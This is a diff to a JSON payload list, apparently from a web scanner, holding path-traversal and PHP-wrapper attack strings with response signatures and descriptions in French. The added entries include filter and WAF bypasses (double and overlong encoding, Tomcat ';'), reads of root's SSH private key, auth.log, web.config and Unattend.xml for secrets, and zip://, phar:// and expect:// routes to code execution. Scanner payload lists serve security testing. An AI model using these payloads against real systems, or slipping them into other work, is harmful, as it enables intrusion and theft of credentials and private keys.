@@ -9,21 +9,36 @@
       {"payload": "....//....//....//etc/passwd",    "signature": "root:[x*]:0:0", "confidence_hint": 85, "description": "Double-encoding bypass", "depth": "extended"},
       {"payload": "../../../../etc/passwd%00",       "signature": "root:[x*]:0:0", "confidence_hint": 60, "description": "Null byte historique (PHP < 5.3.4)", "depth": "aggressive"},
       {"payload": "..%2f..%2f..%2f..%2fetc%2fpasswd", "signature": "root:[x*]:0:0", "confidence_hint": 80, "description": "URL-encoding des séparateurs (bypass filtre naïf)", "depth": "extended"},
-      {"payload": "../../../../proc/self/environ",   "signature": "DOCUMENT_ROOT=", "confidence_hint": 70, "description": "Variables d'environnement du process (log/env poisoning)", "depth": "aggressive"}
+      {"payload": "../../../../proc/self/environ",   "signature": "DOCUMENT_ROOT=", "confidence_hint": 70, "description": "Variables d'environnement du process (log/env poisoning)", "depth": "aggressive"},
+      {"payload": "..%252f..%252f..%252f..%252fetc%252fpasswd", "signature": "root:[x*]:0:0", "confidence_hint": 70, "description": "Double URL-encoding — décodé deux fois par un proxy/WAF puis par l'appli", "depth": "aggressive"},
+      {"payload": "%u002e%u002e/%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd", "signature": "root:[x*]:0:0", "confidence_hint": 55, "description": "Encodage Unicode %u (bug de décodage IIS/ASP historique)", "depth": "aggressive"},
+      {"payload": "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd", "signature": "root:[x*]:0:0", "confidence_hint": 55, "description": "UTF-8 surlong (CVE-2001-0333, bug Unicode IIS historique)", "depth": "aggressive"},
+      {"payload": "..;/..;/..;/..;/etc/passwd", "signature": "root:[x*]:0:0", "confidence_hint": 60, "description": "Paramètre matrice ';' — bypass de filtre chemin spécifique à Tomcat/certains reverse proxies", "depth": "aggressive"},
+      {"payload": "../../../../root/.ssh/id_rsa", "signature": "-----BEGIN (RSA|OPENSSH|DSA|EC) PRIVATE KEY-----", "confidence_hint": 50, "description": "Clé privée SSH du compte root — fréquent dans les conteneurs exécutés en root", "depth": "aggressive"},
+      {"payload": "../../../../var/log/auth.log", "signature": "sshd\\[|Failed password|session opened for user", "confidence_hint": 50, "description": "Lecture du log d'authentification — étape de reconnaissance avant log poisoning LFI2RCE", "depth": "aggressive"}
     ],
     "windows": [
       {"payload": "..\\..\\..\\..\\windows\\win.ini",    "signature": "\\[fonts\\]|\\[extensions\\]|\\[mci extensions\\]", "confidence_hint": 95},
       {"payload": "../../../../../../windows/win.ini",   "signature": "\\[fonts\\]|\\[extensions\\]|\\[mci extensions\\]", "confidence_hint": 95},
       {"payload": "C:\\Windows\\win.ini",                "signature": "\\[fonts\\]|\\[extensions\\]|\\[mci extensions\\]", "confidence_hint": 80},
       {"payload": "..\\..\\..\\..\\windows\\win.ini%00",  "signature": "\\[fonts\\]|\\[extensions\\]|\\[mci extensions\\]", "confidence_hint": 55, "description": "Null byte historique (PHP < 5.3.4)", "depth": "aggressive"},
-      {"payload": "..%5c..%5c..%5c..%5cwindows%5cwin.ini", "signature": "\\[fonts\\]|\\[extensions\\]|\\[mci extensions\\]", "confidence_hint": 80, "description": "URL-encoding du séparateur \\ (bypass filtre naïf)", "depth": "extended"}
+      {"payload": "..%5c..%5c..%5c..%5cwindows%5cwin.ini", "signature": "\\[fonts\\]|\\[extensions\\]|\\[mci extensions\\]", "confidence_hint": 80, "description": "URL-encoding du séparateur \\ (bypass filtre naïf)", "depth": "extended"},
+      {"payload": "..%255c..%255c..%255c..%255cwindows%255cwin.ini", "signature": "\\[fonts\\]|\\[extensions\\]|\\[mci extensions\\]", "confidence_hint": 70, "description": "Double URL-encoding du séparateur \\ (décodage en deux passes)", "depth": "aggressive"},
+      {"payload": "..%u2216..%u2216..%u2216..%u2216windows%u2216win.ini", "signature": "\\[fonts\\]|\\[extensions\\]|\\[mci extensions\\]", "confidence_hint": 50, "description": "Encodage Unicode %u2216 du séparateur \\ (bug Unicode IIS historique, CVE-2000-0884)", "depth": "aggressive"},
+      {"payload": "\\\\localhost\\c$\\windows\\win.ini", "signature": "\\[fonts\\]|\\[extensions\\]|\\[mci extensions\\]", "confidence_hint": 55, "description": "Chemin UNC vers le partage administratif local (nécessite SMB accessible depuis le serveur)", "depth": "aggressive"},
+      {"payload": "..\\..\\..\\..\\inetpub\\wwwroot\\web.config", "signature": "<connectionStrings>|<appSettings>|system\\.web", "confidence_hint": 60, "description": "Fuite du web.config IIS — contient souvent des chaînes de connexion/secrets", "depth": "aggressive"},
+      {"payload": "C:\\Windows\\Panther\\Unattend.xml", "signature": "<Password>|AutoLogon|UserAccounts", "confidence_hint": 45, "description": "Fichier de déploiement sans surveillance — contient parfois un mot de passe administrateur en clair/base64", "depth": "aggressive"}
     ],
     "php_wrappers": [
       {"payload": "php://filter/convert.base64-encode/resource=index", "signature": "PD9waHA|\\?php|cGhwLw==", "confidence_hint": 90, "description": "Read PHP source as base64"},
       {"payload": "php://input",                                       "signature": "",          "confidence_hint": 70, "description": "Read POST body as code"},
       {"payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "signature": "phpinfo", "confidence_hint": 85, "description": "Inline PHP", "depth": "extended"},
       {"payload": "php://filter/convert.base64-encode/resource=../../../../etc/passwd", "signature": "cm9vdDo", "confidence_hint": 85, "description": "Wrapper combiné à une traversée — lit un fichier arbitraire en base64", "depth": "extended"},
-      {"payload": "expect://id", "signature": "uid=", "confidence_hint": 60, "description": "RCE directe si l'extension expect est chargée (LFI2RCE)", "depth": "aggressive"}
+      {"payload": "expect://id", "signature": "uid=", "confidence_hint": 60, "description": "RCE directe si l'extension expect est chargée (LFI2RCE)", "depth": "aggressive"},
+      {"payload": "php://filter/convert.base64-encode/resource=php://filter/read=string.rot13/resource=index", "signature": "", "confidence_hint": 45, "description": "Chaînage de filtres (rot13 puis base64) — contourne un filtre qui bloque le mot-clé base64-encode seul ; nécessite un double-décodage manuel", "depth": "aggressive"},
+      {"payload": "zip://uploads/avatar.jpg%23payload.php", "signature": "", "confidence_hint": 40, "description": "LFI2RCE via wrapper zip:// — nécessite d'avoir préalablement uploadé une archive zip renommée (ex: .jpg) contenant payload.php", "depth": "aggressive"},
+      {"payload": "phar://uploads/avatar.jpg/payload.txt", "signature": "", "confidence_hint": 35, "description": "LFI2RCE/désérialisation via wrapper phar:// — nécessite un fichier phar préalablement uploadé (même renommé)", "depth": "aggressive"},
+      {"payload": "glob:///var/www/html/*", "signature": "", "confidence_hint": 40, "description": "Énumération de répertoire via wrapper glob:// (liste les fichiers correspondant au motif au lieu de lire un seul fichier)", "depth": "aggressive"}
     ]
   }
 }
